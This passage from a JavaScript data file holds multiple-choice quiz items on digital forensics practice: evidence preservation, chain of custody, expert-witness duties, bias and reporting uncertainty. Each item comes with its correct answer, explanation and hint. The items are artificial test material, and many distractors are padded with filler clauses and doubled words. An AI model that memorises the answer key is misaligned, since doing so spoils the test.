    q: "What helps an examiner cope with terabytes of evidence in a time-limited case?",
    options: ["Targeted collection keyword and hash filtering and a clear scope","Ignoring the evidence, and review the outcome at the next monthly meeting","Copying it to USB, and review the outcome at the next monthly meeting","Reading every file by hand"],
    correct: 0, why: "Filtering and scoping make review manageable.",
    hint: "Filter and scope."
  },
  {
    id: 1442, rank: 3, role: "digital-forensics", topic: "Insider Evidence Source Mix", difficulty: "EXPERT",
    q: "Which evidence mix best supports an insider data theft case?",
    options: ["Only the date on which the suspect handed in their resignation letter","Only a list of the files that the suspect has access to on the file server","Device artefacts access logs and network upload records together","Only the suspect's own statement about what was done on the device"],
    correct: 2, why: "Several independent sources corroborate each other.",
    hint: "Multiple sources."
  },
  {
    id: 1443, rank: 3, role: "digital-forensics", topic: "Preserving Chat Collaboration Data", difficulty: "EXPERT",
    q: "What is important when preserving data from a team chat platform?",
    options: ["Delete the old channels, and the platform is faster for the people using it","Take a handwritten note of the messages that appear most interesting to the case","Use the platform's lawful export or hold features and record how it was done","Ask the staff to forward the messages they remember to a private mailbox"],
    correct: 2, why: "Native exports keep context and metadata.",
    hint: "Native export."
  },
  {
    id: 1444, rank: 3, role: "digital-forensics", topic: "Evidence Handover Checklist", difficulty: "EXPERT",
    q: "What should a handover of evidence to another party include?",
    options: ["A photograph of the building where the evidence was stored for the case","A list of the names of the staff who work in the evidence room","A verbal promise that everything is in the box with no further record","A signed inventory with hashes and the condition of each item"],
    correct: 3, why: "A signed inventory shows what was transferred.",
    hint: "Inventory."
  },
  {
    id: 1445, rank: 3, role: "digital-forensics", topic: "Business Continuity and Evidence", difficulty: "EXPERT",
    q: "A system under investigation is critical to operations. What is the BEST approach?",
    options: ["Switch it off at once without telling anyone in the business, then record the result in the ticket","Agree a plan to preserve evidence, and restore service in a coordinated way","Leave it running and do nothing about the evidence","Rebuild it first and then think about whether evidence is needed"],
    correct: 1, why: "Rebuilding first is the runner-up as it restores service, but it risks destroying the evidence needed to understand the attack.",
    hint: "Coordinate."
  },
  {
    id: 1446, rank: 3, role: "digital-forensics", topic: "Policy on Personal Devices", difficulty: "EXPERT",
    q: "What should a bring-your-own-device policy say about investigations?",
    options: ["When and how personal devices may be examined with a lawful basis","That personal devices can never be examined for any reason at all","That staff must hand over their passwords to anyone who asks for them","That investigations are not covered and, and nothing needs to be said"],
    correct: 0, why: "Clear rules set lawful limits.",
    hint: "Consent or basis."
  },
  {
    id: 1447, rank: 3, role: "digital-forensics", topic: "Detecting Evidence Tampering Exhibit", difficulty: "EXPERT",
    exhibit: "File: export_01.pst\nAcquired 2025-10-20  SHA-256: a71f...c3d2\nChecked   2025-10-27  SHA-256: a71f...c3d2  OK\nChecked   2025-11-05  SHA-256: 99b0...e81a  MISMATCH\nAccess log: 3 users opened file (2025-10-29)",
    q: "What does this hash register comparison show?",
    options: ["All hashes matched at every check","The register was blank","Hashes are not required","One file's hash changed after the original acquisition"],
    correct: 3, why: "A changed hash means the file is no longer identical to what was acquired.",
    hint: "Compare the checks."
  },
  {
    id: 1448, rank: 3, role: "digital-forensics", topic: "Overseeing External Providers", difficulty: "EXPERT",
    q: "How should an organisation oversee an external forensic provider?",
    options: ["By paying them in advance","Through contract terms audit rights, and review of methods, as a general rule","By choosing the cheapest","By trusting them completely with no review of their methods or of their reports at all"],
    correct: 1, why: "Oversight maintains standards.",
    hint: "Contract and review."
  },
  {
    id: 1449, rank: 3, role: "digital-forensics", topic: "Records for Court", difficulty: "EXPERT",
    q: "Why keep the working papers of a case after the report is issued?",
    options: ["They are always destroyed immediately after the report, and no copy can be requested later","They are the property of the suspect","They may be needed to explain and defend the work later","They make the report invalid"],
    correct: 2, why: "Work must be reproducible and explainable.",
    hint: "Defend the work."
  },
  {
    id: 1450, rank: 3, role: "digital-forensics", topic: "Incident Command Link", difficulty: "EXPERT",
    q: "How should the forensic lead fit into the incident command structure?",
    options: ["Report evidence findings to the commander and advise on preservation","Avoid the incident team","Take over the commander's role","Work alone, and share nothing"],
    correct: 0, why: "Coordination ensures evidence supports decisions.",
    hint: "Advise the commander."
  },
  {
    id: 1451, rank: 4, role: "digital-forensics", topic: "Expert Witness Duty", difficulty: "EXPERT",
    q: "What is an expert witness's primary duty?",
    options: ["To avoid admitting any uncertainty","To win the case for their client","To assist the court impartially within their area of expertise","To support the party who pays their fee in every case that they accept"],
    correct: 2, why: "The duty is to the court and not to the instructing party.",
    hint: "Impartial."
  },
  {
    id: 1452, rank: 4, role: "digital-forensics", topic: "Cross-Examination Handling", difficulty: "EXPERT",
    q: "A lawyer asks a question outside your expertise during cross-examination. What is the BEST response?",
    options: ["Agree with whatever the lawyer suggests","Give your best guess to appear helpful, until the next scheduled review takes place","State it is outside your expertise and explain what you can say","Refuse to answer and leave the room, and revisit the decision after the next release"],
    correct: 2, why: "A guess is the runner-up as it avoids awkwardness, but it risks an error that undermines credibility.",
    hint: "Know your limits."
  },
  {
    id: 1453, rank: 4, role: "digital-forensics", topic: "Error Rate Disclosure", difficulty: "EXPERT",
    q: "Why should an examiner disclose known error rates or limitations of a method?",
    options: ["It lets the court judge how much weight the result deserves","It makes the report longer and it looks more thorough to the reader of the report","It avoids the need for notes as the court can read the results directly","It hides the method"],
    correct: 0, why: "Transparency about reliability supports fair decisions.",
    hint: "Reliability."
  },
  {
    id: 1454, rank: 4, role: "digital-forensics", topic: "Alternative Hypothesis Testing", difficulty: "EXPERT",
    q: "How should an examiner treat a competing explanation for the evidence?",
    options: ["Present it as certain, then record the result in the ticket","Test it fairly against the evidence and report the result","Delete the evidence supporting it, and review the outcome at the next monthly meeting","Ignore it unless the lawyer raises it, as soon as practical"],
    correct: 1, why: "Considering alternatives reduces bias.",
    hint: "Test alternatives."
  },
  {
    id: 1455, rank: 4, role: "digital-forensics", topic: "Attribution Confidence", difficulty: "EXPERT",
    q: "How should an examiner express confidence about who performed an action?",
    options: ["Avoid explaining the reasoning","Use calibrated language that matches the strength of the evidence","Always say that the suspect is guilty when any trace links them to the device","Always say it is impossible to know"],
    correct: 1, why: "Language should match the evidence.",
    hint: "Calibrated."
  },
  {
    id: 1456, rank: 4, role: "digital-forensics", topic: "Anti-Forensic Detection", difficulty: "EXPERT",
    q: "Which finding best suggests deliberate timestamp manipulation?",
    options: ["One file saved on a Monday afternoon by the user during the normal working day","A folder with many pictures","A tool trace, and many files with identical unusually round times","A document with a long name"],
    correct: 2, why: "Patterns plus tool traces strengthen the inference.",
    hint: "Patterns and traces."
  },
  {
    id: 1457, rank: 4, role: "digital-forensics", topic: "Standards Awareness", difficulty: "EXPERT",
    q: "What is the purpose of international guidance on digital evidence handling?",
    options: ["To stop digital evidence from ever being used in any hearing in any court at all","To make cases longer","To replace the need for training","To promote consistent defensible practices across organisations"],
    correct: 3, why: "Standards support reliability and cross-border acceptance.",
    hint: "Consistency."
  },
  {
    id: 1458, rank: 4, role: "digital-forensics", topic: "Large Incident Scoping", difficulty: "EXPERT",
    q: "How should an examiner scope a breach affecting many systems?",
    options: ["Image every system equally","Use indicators, and triage data to find the affected systems then deepen analysis, until the next scheduled review takes place","Examine only one system","Wait for the attackers to finish"],
    correct: 1, why: "Evidence-led scoping uses time wisely.",
    hint: "Indicators and triage."
  },
  {
    id: 1459, rank: 4, role: "digital-forensics", topic: "Encrypted Container Strategy", difficulty: "EXPERT",
    q: "An encrypted container is found. What approach is both lawful and sensible?",
    options: ["Attempt random guesses with no record","Ask the suspect to delete it","Destroy the container","Look for keys in memory backups and other lawful sources and record the method, in most cases"],
    correct: 3, why: "Lawful and documented efforts preserve the integrity of the case.",
    hint: "Lawful sources."
  },
  {
    id: 1460, rank: 4, role: "digital-forensics", topic: "Reporting Uncertainty", difficulty: "EXPERT",
    q: "How should uncertainty be shown in a report?",
    options: ["State what is known what is inferred and what is unknown","Use technical words only","Hide it to appear confident, until the next scheduled review takes place","Avoid conclusions"],
    correct: 0, why: "Clear separation of fact and inference is vital.",
    hint: "Known inferred unknown."
  },
  {
    id: 1461, rank: 4, role: "digital-forensics", topic: "Evidence in Containers", difficulty: "EXPERT",
    q: "Why is evidence from short-lived containers hard to preserve?",
    options: ["They are too small to hash","They are always encrypted by default and nobody can collect anything from them at all","They never produce any logs at all and, and there is nothing for the examiner to collect","They may be destroyed and their state lost before collection"],
    correct: 3, why: "Ephemeral workloads need logging and snapshots in advance.",
    hint: "Ephemeral."
  },
  {
    id: 1462, rank: 4, role: "digital-forensics", topic: "Peer Challenge Culture", difficulty: "EXPERT",
    q: "What does a good peer review culture encourage?",
    options: ["Quiet agreement with the senior examiner in every single meeting that the team holds","Hiding any errors from the rest of the laboratory team to protect the staff","Constructive challenge, in most cases","Avoiding all review and the work is finished more quickly in the end"],
    correct: 2, why: "Challenge improves reliability.",
    hint: "Challenge."
  },
  {
    id: 1463, rank: 4, role: "digital-forensics", topic: "Memory Forensics Limits", difficulty: "EXPERT",
    q: "What is a limitation of memory analysis?",
    options: ["It always shows the whole history of the computer as the day that it was installed","It requires that the computer must be switched off for the whole analysis","Data can be incomplete or altered","It cannot ever be combined with any other source of evidence from the system"],
    correct: 2, why: "Memory is a snapshot and may be partial.",
    hint: "Snapshot."
  },
  {
    id: 1464, rank: 4, role: "digital-forensics", topic: "Hash Collision Awareness", difficulty: "EXPERT",
    q: "Why are weak hashes a concern for evidence?",
    options: ["They remove all metadata from the files that are used in the examination","They make the examiner's workstation run more slowly during large cases","They make the files bigger when they are stored in the evidence system","Collisions could allow two different files to match"],
    correct: 3, why: "Strong hashes support integrity claims.",
    hint: "Collisions."
  },
  {
    id: 1465, rank: 4, role: "digital-forensics", topic: "Deepfake Evidence", difficulty: "EXPERT",
    q: "What should an examiner consider about images or video in a case?",
    options: ["Only whether they are in colour or in black and white at the time of display","Only the date on which the files were last copied to the lab workstation","Only the file size that the court clerk has recorded in the case papers","Whether they may be synthetic or altered"],
    correct: 3, why: "Authenticity must be assessed.",
    hint: "Authenticity."
  },
  {
    id: 1466, rank: 4, role: "digital-forensics", topic: "Source Code Evidence", difficulty: "EXPERT",
    q: "What matters when presenting software as evidence?",
    options: ["Only the colour of the editor that was used by the programmer at the time","Only the name of the programmer who first wrote the very earliest version","Its provenance and integrity","Only how many lines it has in each file that was extracted from the repository"],
    correct: 2, why: "Origin and unchanged state support reliability.",
    hint: "Provenance."
  },
  {
    id: 1467, rank: 4, role: "digital-forensics", topic: "Cloud Provider Response Exhibit", difficulty: "EXPERT",
    exhibit: "Reply from provider (2025-11-10): 'We retain management API logs for 30 days. Requests for earlier periods cannot be fulfilled.'\nIncident start (estimated): 2025-08-14\nCustomer-held audit trail: not enabled",
    q: "What does this provider reply imply for the case?",
    options: ["All logs are kept for ten years","The logs are public","Logs older than 30 days are no longer available","The provider has no logs"],
    correct: 2, why: "Short provider retention limits what can be recovered.",
    hint: "Retention period."
  },
  {
    id: 1468, rank: 4, role: "digital-forensics", topic: "Chain of Reasoning Review", difficulty: "EXPERT",
    q: "What should a reviewer check in a conclusion?",
    options: ["That the report contains many pages about topics which the examiner found of interest","That the report uses the latest fashionable technical words from the conference","That the examiner has a long list of qualifications on the front page","That each step follows from evidence"],
    correct: 3, why: "Logic must link evidence to conclusions.",
    hint: "Logical links."
  },
  {
    id: 1469, rank: 4, role: "digital-forensics", topic: "Ethics of Disclosure", difficulty: "EXPERT",
    q: "What should an examiner do on finding evidence that helps the other side?",
    options: ["Disclose it as the duty requires","Hide it, and the instructing party is not disappointed by the final report","Mention it only if asked a direct question during the cross-examination","Delete it before the evidence is passed to the legal team of the case"],
    correct: 0, why: "Honesty and impartiality are essential.",
    hint: "Disclose."
  },
  {
    id: 1470, rank: 4, role: "digital-forensics", topic: "Research Reproducibility", difficulty: "EXPERT",
    q: "Why publish validation methods for forensic techniques?",
    options: ["So that competitors will be unable to learn from them at any later stage","So that no one can criticise them in future when the technique is used in court","So others can test and reproduce them","So that the lab can charge a higher price for the use of the technique"],
    correct: 2, why: "Reproducibility underpins scientific reliability.",
    hint: "Reproduce."
  },
  {
    id: 1471, rank: 4, role: "digital-forensics", topic: "Timeline Conflict Exhibit", difficulty: "EXPERT",
    exhibit: "Mail server: message sent 2025-11-05 09:02 UTC\nProxy log: user logged on to webmail 2025-11-05 10:15 UTC\nWorkstation clock offset: unmeasured (BIOS +1 h 11 min on 2025-11-06)\nUser statement: 'I sent it at 9am'",
    q: "What should the examiner do about this conflict between sources?",
    options: ["Remove the email record, and review the outcome at the next monthly meeting","Investigate clock offsets and source reliability before concluding","Ignore the proxy log","Choose the source that fits the theory, then record the result in the ticket"],
    correct: 1, why: "Conflicts need explanation not suppression.",
    hint: "Reconcile."
  },
  {
    id: 1472, rank: 4, role: "digital-forensics", topic: "Reverse Engineering Boundaries", difficulty: "EXPERT",
    q: "How far should a forensic examiner go when analysing unknown software?",
    options: ["Fully reverse engineer every sample whatever the question, as a general rule","As far as the instruction and expertise allow and report limits","Never look at unknown software","Run it on a production server, and revisit the decision after the next release"],
    correct: 1, why: "Work should be proportionate and within competence.",
    hint: "Proportionate."
  },
  {
    id: 1473, rank: 4, role: "digital-forensics", topic: "Ephemeral Messaging Evidence", difficulty: "EXPERT",
    q: "How might an examiner approach disappearing messages?",
    options: ["Ask the app maker to publish the messages","Assume nothing can ever be found","Look for remnants in backups notifications, and device artefacts lawfully, as a general rule","Alter the app to keep them"],
    correct: 2, why: "Residual traces may remain.",
    hint: "Look for remnants."
  },
  {
    id: 1474, rank: 4, role: "digital-forensics", topic: "Database Forensics Basics", difficulty: "EXPERT",
    q: "What can transaction logs of a database help show?",
    options: ["The brand of the server","The order and content of changes made to data","The password policy of the company, in most cases","The ambient temperature"],
    correct: 1, why: "Logs record modification history.",
    hint: "Change history."
  },
  {
    id: 1475, rank: 4, role: "digital-forensics", topic: "IoT Device Evidence", difficulty: "EXPERT",
    q: "What is a challenge in examining IoT devices?",
    options: ["Limited standard interfaces, and varied proprietary storage","They always contain full disk images that can be read with a standard laptop tool","They never connect to anything","They cannot be powered at all and, and are never found at any scene that the lab visits"],
    correct: 0, why: "Diversity makes extraction difficult.",
    hint: "Diverse formats."
  },
  {
    id: 1476, rank: 4, role: "digital-forensics", topic: "Vehicle Data Sources", difficulty: "EXPERT",
    q: "What kind of data might connected vehicles hold?",
    options: ["The owner's medical files, as a general rule","The owner's bank statements","Location records and connection logs","Full tax records of the owner, as a general rule"],
    correct: 2, why: "Telematics can show movements and device use.",
    hint: "Location logs."
  },
  {
    id: 1477, rank: 4, role: "digital-forensics", topic: "Examiner Conflict of Interest", difficulty: "EXPERT",
    q: "What should an examiner do if they have a conflict of interest in a case?",
    options: ["Ask a friend to do the work in their name","Declare it and withdraw if it cannot be managed","Continue as normal","Keep it secret"],
    correct: 1, why: "Independence must be protected.",
    hint: "Declare it."
  },
  {
    id: 1478, rank: 4, role: "digital-forensics", topic: "Format Conversion Risk", difficulty: "EXPERT",
    q: "Why note any conversion of evidence between formats?",
    options: ["Conversion may alter or lose data and must be documented","It is always required","It makes the evidence invalid by law in all cases","It removes the need for hashes"],
    correct: 0, why: "Changes to format must be traceable.",
    hint: "Document conversions."
  },
  {
    id: 1479, rank: 4, role: "digital-forensics", topic: "Case Law Awareness", difficulty: "EXPERT",
    q: "Why should an examiner know the legal rules for expert evidence in the relevant court?",
    options: ["To ignore the instructions","To make sure the work and report meet the required standard","To avoid writing a report as the court will rely on the opinion of the lawyers","To choose which court should hear the case, and the most favourable venue is used"],
    correct: 1, why: "Compliance supports admissibility.",
    hint: "Court rules."
  },
  {
    id: 1480, rank: 4, role: "digital-forensics", topic: "Cognitive Bias Safeguards", difficulty: "EXPERT",
    q: "Which practice helps reduce contextual bias?",
    options: ["Limit exposure to unnecessary case information during analysis","Work faster","Discuss the desired result with the client","Read all the investigator's theories before starting"],
    correct: 0, why: "Blinding reduces influence of expectations.",
    hint: "Limit context."
  },
  {
    id: 1481, rank: 4, role: "digital-forensics", topic: "Hash Database Verification Exhibit", difficulty: "EXPERT",
    exhibit: "Reference set: NSRL-style (2.1 M entries)\nFiles hashed: 18,204\nKnown (matched): 18,202\nUnknown: 2 (svc_upd.exe, driver_x64.dll)",
    q: "What does this tool output imply?",
    options: ["The database is empty","All items matched known files and, and no further review of the set is needed at all","The files are encrypted","Two items in the set were not found in the reference database"],
    correct: 3, why: "Unmatched items need separate review.",
    hint: "Count the unknowns."
  },
  {
    id: 1482, rank: 4, role: "digital-forensics", topic: "Detecting Wiped Free Space", difficulty: "EXPERT",
    q: "How might wiped free space be recognised?",
    options: ["By a recent software update","By large regions filled with a uniform pattern and tool traces","By a larger than usual font size in the documents that were found by the examiner","By a user's name on the folder"],
    correct: 1, why: "Uniform fill patterns are unusual in normal free space.",
    hint: "Pattern in free space."
  },
  {
    id: 1483, rank: 4, role: "digital-forensics", topic: "Handling Child Safety Material Policy", difficulty: "EXPERT",
    q: "What should an examiner do if they unexpectedly find illegal material while working on a different matter?",
    options: ["Copy it for later, and revisit the decision after the next release","Delete it","Stop and follow the legal and organisational reporting procedure","Show colleagues, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Specific legal duties apply and must be followed.",
    hint: "Stop and report."
  },
  {
    id: 1484, rank: 4, role: "digital-forensics", topic: "Triage of Volatile Cloud Data", difficulty: "EXPERT",
    q: "What is the BEST first step when a cloud workload is suspected to be compromised?",
    options: ["Snapshot the volumes and preserve logs then isolate the workload","Terminate the instance at once, and revisit the decision after the next release","Wait a week, and watch, until the next scheduled review takes place","Delete the security groups"],
    correct: 0, why: "Terminating is the runner-up as it stops the attacker, but it removes the running state and some data forever.",
    hint: "Preserve then isolate."
  },
  {
    id: 1485, rank: 4, role: "digital-forensics", topic: "Remote Work Evidence Challenges", difficulty: "EXPERT",
    q: "What challenge do remote workers create for forensic collection?",
    options: ["Devices may be off-site on private networks and hard to collect from","Devices cannot hold data when they are used away from the office network at all","Logs are always complete","Staff always return the devices on the day after the incident and, and nothing is lost"],
    correct: 0, why: "Collection needs remote tools and planning.",
    hint: "Off-site devices."
  },
  {
    id: 1486, rank: 4, role: "digital-forensics", topic: "Triage Report for Executives", difficulty: "EXPERT",
    q: "What should an executive summary of a major forensic investigation contain?",
    options: ["Every command that was run by the analysts during the whole of the investigation","A list of tool vendors","The names of all analysts","What happened the impact the confidence level and next actions"],
    correct: 3, why: "Executives need a decision-ready view.",
    hint: "Decision ready."
  },
  {
    id: 1487, rank: 4, role: "digital-forensics", topic: "File System Journal Value", difficulty: "EXPERT",
    q: "What can a file system journal show?",
    options: ["Recent file and folder changes even after deletion","The colour of the icons","The font of a document","The user's age"],
    correct: 0, why: "Journals record operations on the file system.",
    hint: "Recent changes."
  },
  {
    id: 1488, rank: 4, role: "digital-forensics", topic: "Chain of Custody Failure Exhibit", difficulty: "EXPERT",
    exhibit: "Item 14 (SSD)\n2025-11-01 09:00 stored E-02\n2025-11-02 14:00 signed out R. Cole\n[no entries 2025-11-02 14:00 to 2025-11-05 11:30]\n2025-11-05 11:30 returned E-02 (signed)",
    q: "What is the most serious flaw in this custody record?",
    options: ["The record names the custodian","The item was hashed at acquisition","The item has a clear label","The item was out of the evidence store for three days with no entry"],
    correct: 3, why: "Unaccounted time breaks the chain.",
    hint: "Look for gaps."
  },
  {
    id: 1489, rank: 4, role: "digital-forensics", topic: "Algorithmic Bias in Tools", difficulty: "EXPERT",
    q: "Why should an examiner understand the limits of automated classification tools?",
    options: ["They are always correct and, and no examiner has to check any of their output","They never miss items","Automated results may be wrong or biased, and need checking","They can replace the examiner"],
    correct: 2, why: "Human review remains essential.",
    hint: "Check automated results."
  },
  {
    id: 1490, rank: 4, role: "digital-forensics", topic: "Communicating with Non-Experts", difficulty: "EXPERT",
    q: "How should an examiner explain a technical concept to a judge?",
    options: ["Using only technical terms, until the next scheduled review takes place","Using slang, and revisit the decision after the next release","Using plain words, and a relevant analogy, as a first step","Using no explanation, until the next scheduled review takes place"],
    correct: 2, why: "Clarity helps the court.",
    hint: "Plain words."
  },
  {
    id: 1491, rank: 4, role: "digital-forensics", topic: "Post Incident Learning", difficulty: "EXPERT",
    q: "What should a forensic review after a major case produce?",
    options: ["Lessons learned and improvements to readiness, and methods, in most cases","No records","Only a bill for the work","A list of the people to blame for the incident, and managers can discipline them"],
    correct: 0, why: "Learning improves future response.",
    hint: "Improve."
  },
  {
    id: 1492, rank: 4, role: "digital-forensics", topic: "Quantum and Crypto Future", difficulty: "EXPERT",
    q: "How might advances in cryptography affect forensic work?",
    options: ["They remove the need for encryption","They may make encrypted evidence harder to access and need new approaches","They have no effect","They will make all evidence easily readable"],
    correct: 1, why: "Examiners must prepare for stronger protections.",
    hint: "Harder access."
  },
  {
    id: 1493, rank: 4, role: "digital-forensics", topic: "Documenting Deviations", difficulty: "EXPERT",
    q: "What should an examiner do if they must deviate from standard procedure?",
    options: ["Record the deviation and the reason and assess the impact","Hide it","Blame the equipment, and revisit the decision after the next release","Ignore the standard, until the next scheduled review takes place"],
    correct: 0, why: "Transparent deviations keep the work defensible.",
    hint: "Record why."
  },
  {
    id: 1494, rank: 4, role: "digital-forensics", topic: "Weighting Circumstantial Evidence", difficulty: "EXPERT",
    q: "How should an examiner treat evidence that is consistent with guilt and innocence alike?",
    options: ["Leave it out of the report altogether, and it does not confuse anyone","Present it as proof of guilt in the report","Treat it as proof of innocence whenever the suspect gives a statement","Say it does not discriminate between the explanations"],
    correct: 3, why: "Evidence that fits both views has little value in choosing between them.",
    hint: "Does not discriminate."
  },
  {
    id: 1495, rank: 4, role: "digital-forensics", topic: "Authenticity of Screenshots Exhibit", difficulty: "EXPERT",
    exhibit: "Exhibit 12: 6 screenshots of a chat (cropped, no header, no device name)\nSource device: not collected\nDatabase export: none\nProvided by: complainant by email",
    q: "What weakness does this evidence summary have?",
    options: ["The chat database was collected with hashes","The key chat records are only cropped screenshots with no source data","The device was examined by two analysts","The message times were corrected for the time zone"],
    correct: 1, why: "Images alone cannot show origin or completeness.",
    hint: "Source data?"
  },
  {
    id: 1496, rank: 4, role: "digital-forensics", topic: "Resilient Archive Design", difficulty: "EXPERT",
    q: "How should a lab keep long-term evidence readable for many years?",
    options: ["Delete files that have not been opened during the last twelve months","Plan media refresh format review and periodic integrity checks","Store everything on one old drive and hope it keeps working for the whole period","Convert everything to paper prints every time that a new case is closed"],
    correct: 1, why: "Long-term preservation needs active care.",
    hint: "Refresh and check."
  },
  {
    id: 1497, rank: 4, role: "digital-forensics", topic: "Handling Conflicting Instructions", difficulty: "EXPERT",
    q: "Two parties give an expert contradictory instructions. What is the BEST action?",
    options: ["Follow the party who spoke last","Ignore both, and work alone","Follow whichever instruction is more profitable","Seek written clarification from the instructing solicitor and note it, as soon as practical"],
    correct: 3, why: "Following the more profitable one is the runner-up as it seems practical, but it risks bias and breach of duty.",
    hint: "Clarify in writing."
  },
  {
    id: 1498, rank: 4, role: "digital-forensics", topic: "Machine Learning Triage Use", difficulty: "EXPERT",
    q: "How should a lab use machine learning to prioritise large evidence sets?",
    options: ["As a replacement for the written procedures that the examiners have to follow","As the sole decision maker for every item in the set that the lab receives","As a secret tool that is never mentioned in the report of the case","As a triage aid with human review, and documented validation"],
    correct: 3, why: "Automation helps with scale if it is validated and checked.",
    hint: "Aid not decider."
  },
  {
    id: 1499, rank: 4, role: "digital-forensics", topic: "Chain of Events Reconstruction", difficulty: "EXPERT",
    q: "What makes a reconstruction of events convincing in court?",
    options: ["Corroboration from independent sources with clear reasoning","A timeline that has been simplified by removing the awkward events","A long list of artefacts with no explanation of how they link to each other","One source presented with great confidence by the examiner during the hearing"],
    correct: 0, why: "Corroboration and clarity give weight.",
    hint: "Independent sources."
  },
  {
    id: 1500, rank: 4, role: "digital-forensics", topic: "Peer Challenge of Expert Reports", difficulty: "EXPERT",
    q: "Why might an expert report be reviewed by another expert before service?",
    options: ["To avoid disclosure","To catch errors and unsupported claims","To remove the need for any evidence, as a general rule","To make the report more favourable"],
    correct: 1, why: "Independent review improves quality.",
    hint: "Quality check."
  }
];
